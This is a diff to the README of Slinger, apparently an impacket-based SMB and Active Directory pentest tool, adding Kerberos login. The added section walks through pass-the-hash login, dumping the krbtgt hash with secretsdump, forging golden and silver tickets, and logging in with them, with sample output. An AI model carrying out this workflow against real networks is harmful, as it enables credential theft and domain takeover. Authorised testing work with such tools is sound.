@@ -47,23 +47,26 @@ python3 slinger.py -h
 
       __,_____
      / __.==--"   SLINGER
-    /#(-'             v1.16.0
+    /#(-'             v1.17.0
     `-'                    a ghost-ng special
 
 usage: slinger.py [-h] [--host HOST] [-u USERNAME] [--pass PASSWORD | --ntlm NTLM | --kerberos]
-                  [-d DOMAIN] [-p PORT] [--timeout TIMEOUT] [--nojoy] [--debug]
+                  [-d DOMAIN] [-p PORT] [--timeout TIMEOUT] [--dc-ip IP]
+                  [--sync-clock] [--nojoy] [--debug]
                   [--profile NAME] [--save-profile NAME] [--list-profiles]
 
 impacket swiss army knife (sort of)
 
 options:
   -h, --help            show this help message and exit
-  --host HOST           Host to connect to
+  --host HOST           Host to connect to (use hostname for Kerberos, IP for NTLM)
   -u, --user, --username USERNAME
                         Username for authentication
   -d, --domain DOMAIN   Domain for authentication (default: )
   -p, --port PORT       Port to connect to (default: 445)
   --timeout TIMEOUT     Global SMB connection timeout in seconds (default: 86400)
+  --dc-ip IP            IP of the domain controller (KDC) for Kerberos authentication
+  --sync-clock          Sync Kerberos timestamps with DC via NTP to fix clock skew
   --nojoy               Turn off emojis
   --verbose             Enable verbose output
   --debug               Turn on debug output
@@ -82,7 +85,7 @@ connection profiles:
   --list-profiles       List saved connection profiles
 ```
 
-Slinger offers multiple authentication methods. All methods are built on impacket functions and should therefore function the same. *Warning:* Kerberos login has not been fully tested.
+Slinger offers multiple authentication methods. All methods are built on impacket functions and should therefore function the same.
 
 ### Login with password
 
@@ -91,7 +94,7 @@ python3 slinger.py --host 192.168.177.130 --user admin --pass admin
 
       __,_____
      / __.==--"   SLINGER
-    /#(-'             v1.16.0
+    /#(-'             v1.17.0
     `-'                    a ghost-ng special
 
 [*] Connecting to 192.168.177.130:445...
@@ -115,7 +118,7 @@ python3 slinger.py --host 10.0.0.28 --user Administrator --ntlm :5E119EC7919CC3B
 
       __,_____
      / __.==--"   SLINGER
-    /#(-'             v1.16.0
+    /#(-'             v1.17.0
     `-'                    a ghost-ng special
 
 [*] Connecting to 10.0.0.28:445...
@@ -148,6 +151,55 @@ python3 slinger.py --list-profiles
 ```
 
 Profiles are stored in `~/.slinger/profiles/` with `chmod 600` permissions. Credentials (NTLM hash, password) are saved in the profile so you can reconnect with just `--profile <name>`. Command-line auth flags override stored credentials.
+
+### Login with Kerberos
+
+Kerberos authentication uses a ccache ticket file instead of a password or hash. Slinger can forge golden/silver tickets from within a session using dumped credentials.
+
+**Full workflow: dump hashes, forge ticket, authenticate with Kerberos**
+
+```bash
+# Step 1: Login with NTLM and dump the krbtgt hash
+python3 slinger.py --host 10.10.0.100 --user Administrator --ntlm :hash --domain CORP
+
+[sl] (10.10.0.100):\> use C$
+[+] Connected to share C$
+[sl] (10.10.0.100):\C$> secretsdump --ntds --just-dc-ntlm
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+[+] Extracted 33 secret(s)
+
+# Step 2: Forge a golden ticket (auto-fetches domain SID)
+[sl] (10.10.0.100):\C$> ticket golden --nthash 819af826bb148e603acb0f33d17632f8 --domain corp.local
+[+] Domain SID: S-1-5-21-3072663084-364016917-1341370565
+[+] Golden ticket saved to /home/user/.slinger/Administrator.ccache
+[*] Use with: export KRB5CCNAME=/home/user/.slinger/Administrator.ccache
+
+# Step 3: Login with the forged ticket
+export KRB5CCNAME=/home/user/.slinger/Administrator.ccache
+python3 slinger.py --host DC01.corp.local --domain corp.local --kerberos --dc-ip 10.10.0.100
+[*] Connecting to 10.10.0.100:445...
+[+] Successfully logged in to DC01.corp.local:445
+```
+
+**Key flags for Kerberos:**
+
+| Flag | Purpose |
+|------|---------|
+| `--kerberos` | Use Kerberos authentication (reads `KRB5CCNAME` for ticket) |
+| `--host` | Target hostname — must match the SPN in Active Directory (e.g., `DC01.corp.local`) |
+| `--dc-ip` | IP address of the domain controller — used for TCP connection and KDC communication |
+| `--domain` | Domain FQDN (e.g., `corp.local`) |
+| `--sync-clock` | Query DC time via NTP and adjust Kerberos timestamps to fix clock skew |
+
+**Clock skew:** Kerberos rejects timestamps more than 5 minutes off from the server. Use `--sync-clock` to automatically compensate without changing your system clock.
+
+**Silver tickets** target a specific service (e.g., CIFS) using a machine/service account hash:
+
+```bash
+# Forge a silver ticket for CIFS access
+[sl] (10.10.0.100):\C$> ticket silver --nthash <machine_hash> --spn cifs/DC01.corp.local --domain corp.local
+[+] Silver ticket saved to /home/user/.slinger/Administrator.ccache
+```
 
 ### Available Commands
 
